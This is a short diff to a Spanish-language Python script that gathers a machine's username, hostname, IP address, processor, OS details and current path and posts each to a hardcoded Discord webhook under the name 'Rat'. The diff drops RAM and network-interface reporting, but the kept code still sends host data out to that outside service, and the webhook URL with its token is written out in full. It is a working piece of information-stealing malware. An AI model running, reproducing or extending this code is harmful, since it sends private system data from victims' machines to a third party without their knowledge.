@@ -1,4 +1,4 @@
-import os, requests, socket, platform, datetime, psutil
+import os, requests, socket, platform, datetime
 
 webhook = 'https://discord.com/api/webhooks/1231671522775535799/G7h-1ni-seJgAbzVo1ItNrrk5iaJFvHPycqPkp3XyP5WV55hgQlaGVy_tHSfOpIOcgQz'
 
@@ -28,16 +28,8 @@ message_path = f'`[+] Ubicación actual:` **{path}**'
 message_version = f'`[+] Versión:` **{version}**'
 message_release = f'`[+] Release:` **{release}**'
 message_release = f'`[+] Plataforma:` **{platform}**'
-message_ram = f'`[+] RAM:` **{ram}**'
 
-var_list = [message_date, message_username, message_hostname, message_ip, message_processor_model, message_processor_info, message_system, message_path, message_version, message_release, message_ram]
-
-interfacesRed = psutil.net_if_addrs()
-for interface_name, interface_addresses in interfacesRed.items():
-    for address in interface_addresses:
-        if interface_name != "lo" and address.address != "":                
-                if str(address.family) == 'AddressFamily.AF_INET':
-                        requests.post(webhook, json={'username': 'Rat', 'content': '`[+] Interfaz:` ' + '**' + interface_name + '**'})
+var_list = [message_date, message_username, message_hostname, message_ip, message_processor_model, message_processor_info, message_system, message_path, message_version, message_release]
 
 def send_info():
     for var in var_list:
@@ -51,7 +43,6 @@ try:
 ╩ ╩└─┘ ┴ └─┘─┴┘╚═╝┴  ┴─┘└─┘ ┴ 
 '''
     print('\n' + title + '[+] Información enviada con éxito\n')
-    print('[+] Address: ' + print(address.address) + '\n')
 
 except KeyboardInterrupt:
     print('\n[+] Ha habido una interrupción por parte del teclado\n')
